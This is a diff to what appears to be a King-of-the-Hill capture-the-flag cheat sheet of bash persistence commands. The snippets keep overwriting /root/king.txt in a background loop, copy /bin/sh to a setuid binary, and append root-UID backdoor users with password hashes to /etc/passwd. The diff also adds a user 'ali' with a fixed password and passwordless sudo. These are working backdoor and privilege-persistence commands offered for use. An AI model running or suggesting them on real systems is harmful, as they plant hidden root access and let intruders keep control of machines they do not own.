@@ -262,11 +262,17 @@ lessecho "solcoteh" > /root/king.txt
 set -o noclobber /root/king.txt
 sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null
 
+while true; do (echo -e 'solcoteh' > /root/king.txt); sleep 0.1; done 2>/dev/null &
+
 cp /bin/sh /home/sh && chmod u+s /home/sh
+
+useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
 
 echo 'mobin:$1$8VO3cUZu$als/bleGjZ3SVjE5EGzvh/:0:0:root:/root:/bin/bash' >> /etc/passwd
 echo 'mobin:$6$/LuWBv7L4QbfG1kf$pb0sFxOLHKiMNiAr2vMdpRc2e8mljxoUlm33fY6KEXLzcH7K51zegdnOYygurWuP/2.KW3eQvcBHXBn9/Jqnj0:0:0:root:/root:/bin/bash' >> /etc/passwd
 password=Mobin@
+
+
 ```
 ### Not_Be-king ✅
 ```bash
